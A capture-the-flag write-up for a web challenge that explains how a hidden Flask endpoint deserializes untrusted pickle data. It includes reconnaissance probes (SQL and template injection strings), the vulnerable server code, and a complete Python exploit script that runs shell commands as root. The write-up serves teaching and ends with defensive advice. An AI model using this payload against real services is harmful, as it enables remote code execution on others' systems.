# KPMG CTF 2026: Granny Makes Food — Insecure Deserialization Writeup

## Challenge Information

| Field | Details |
| :--- | :--- |
| **Challenge Name** | Granny Makes Food |
| **Category** | Web Exploitation / Insecure Deserialization (Python Pickle RCE) |
| **Vulnerability** | Unsafe `pickle.loads()` on hidden `POST /exploit` endpoint |
| **Privilege Level** | Root inside container (`uid=0`) |

---

## 1. Challenge Description

> *"Do you want to challenge Granny to a food competition? She makes the best sour items."*

The target website hosts a static "Access Portal" titled **"The Access Portal that no one can access"**, featuring an administrative login form (`user` field only) submitting to `/login`.

---

## 2. Reconnaissance & The Decoy `/login`

```html
<form action="/login" method="POST">
  <input type="text" name="user" placeholder="Enter username">
  <input type="submit" value="Login">
</form>
```

Testing HTTP methods on `/`:
- `POST /` returns `405 Method Not Allowed`, with header `Allow: GET, HEAD, OPTIONS`. This confirmed the underlying Werkzeug/Flask router was functional.

However, submitting to `/login` returned a constant, byte-for-byte `404 Not Found` for every permutation:
- **Methods:** `GET`, `POST`, `OPTIONS`, `TRACE`, `HEAD`
- **Payloads:** `admin`, `' OR '1'='1`, `{{7*7}}`, path traversal, SQLi/SSTI
- **Directory brute-force:** Over 5,000 SecLists entries (`/granny`, `/kitchen`, `/food`, etc.) all returned 404.
- **Race conditions:** Concurrent bursts showed zero timing variance.

**Conclusion:** The visible `/login` form was completely unmapped in Flask routing. It was a deliberate decoy.

---

## 3. Discovering `POST /exploit`

Enumerating unlinked endpoints exposed the actual backend route: `POST /exploit`.

```bash
# Probing GET:
curl -s -i "http://target/exploit"
# HTTP/1.1 405 METHOD NOT ALLOWED
# Allow: POST, OPTIONS

# Probing empty POST JSON:
curl -s -i -X POST -H "Content-Type: application/json" -d '{}' "http://target/exploit"
# HTTP/1.1 500 INTERNAL SERVER ERROR
# {"error":"'data'"}
```

The error `KeyError: 'data'` confirmed that application code was actively parsing a JSON dictionary with key `"data"`.

---

## 4. Source Code Extraction (Via Exploit Primitive)

Once remote command execution was established, reading `/app/server.py` directly from the container verified the vulnerable implementation:

```python
from flask import Flask, request
import os, pickle, subprocess

app = Flask(__name__)

@app.route("/")
def index():
    with open("index.html", "r") as f:
        return f.read(), 200, {"Content-Type": "text/html"}

@app.route("/exploit", methods=["POST"])
def exploit():
    try:
        raw = bytes.fromhex(request.get_json()["data"])
        obj = pickle.loads(raw)  # VULNERABLE: Unsafe deserialization
        return {"result": str(obj)}
    except Exception as e:
        return {"error": str(e)}, 500

if __name__ == "__main__":
    os.system("bash dynflag.sh")
    app.run(host="0.0.0.0", port=5000)
```

The server decodes hex data and passes it directly to `pickle.loads()`. Furthermore, `dynflag.sh` revealed:

```bash
#!/bin/bash
echo $FLAG > /app/flag.txt
```

---

## 5. Exploit: Pickle `__reduce__` to RCE

Python's `pickle` module allows objects to define a `__reduce__` method, which returns a callable and an argument tuple to be invoked upon deserialization. By returning `(subprocess.check_output, (["/bin/sh", "-c", cmd],))`, arbitrary system commands are executed upon unpickling.

### Python Exploit Script

```python
import json
import pickle
import subprocess
import ssl
import urllib.request

class ExploitPayload:
    def __init__(self, cmd):
        self.cmd = cmd
    def __reduce__(self):
        return (subprocess.check_output, (["/bin/sh", "-c", self.cmd],))

def run_rce(base_url, cmd):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    
    hex_data = pickle.dumps(ExploitPayload(cmd)).hex()
    body = json.dumps({"data": hex_data}).encode()
    
    req = urllib.request.Request(
        base_url.rstrip("/") + "/exploit",
        data=body,
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    with urllib.request.urlopen(req, timeout=15, context=ctx) as resp:
        return json.loads(resp.read().decode())

# Example usage:
# print(run_rce("http://target", "id"))
# Output: uid=0(root) gid=0(root) groups=0(root)
# print(run_rce("http://target", "cat /app/flag.txt"))
```

The process executes as `root` (`uid=0`), allowing direct extraction of `/app/flag.txt`.

---

## 6. Key Takeaways & Defense
1. **Never use `pickle` for network serialization:** Python's `pickle` format is inherently unsafe and cannot be sanitized against RCE. Use JSON or Protocol Buffers across trust boundaries.
2. **Decoy Forms in CTFs:** When standard enumeration on a prominent form consistently yields routing 404s, step back and search for alternate, unlinked routes.
3. **Container Principle of Least Privilege:** Running Flask application servers as `root` turns application-level vulnerabilities into immediate total container compromise.
